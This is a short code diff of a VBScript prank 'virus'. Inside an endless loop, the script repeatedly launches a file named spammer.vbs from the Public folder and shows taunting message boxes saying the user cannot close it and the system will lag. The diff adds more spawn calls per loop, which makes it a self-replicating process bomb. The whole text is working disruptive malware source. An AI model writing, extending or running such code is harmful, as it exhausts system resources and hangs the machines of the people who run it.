@@ -9,6 +9,9 @@ Do While True
 	objShell.Run "C:\Users\Public\spammer.vbs" 
 	objShell.Run "C:\Users\Public\spammer.vbs" 
 	objShell.Run "C:\Users\Public\spammer.vbs" 
-	MsgBox "You can't close me! HAHA!",2166800,"Sussy virus"
+	objShell.Run "C:\Users\Public\spammer.vbs" 
+	objShell.Run "C:\Users\Public\spammer.vbs" 
+	objShell.Run "C:\Users\Public\spammer.vbs" 
+	MsgBox "Your system is gonna lag out",2166800,"You can't close me!!!"
 loop
 Set objShell = Nothing
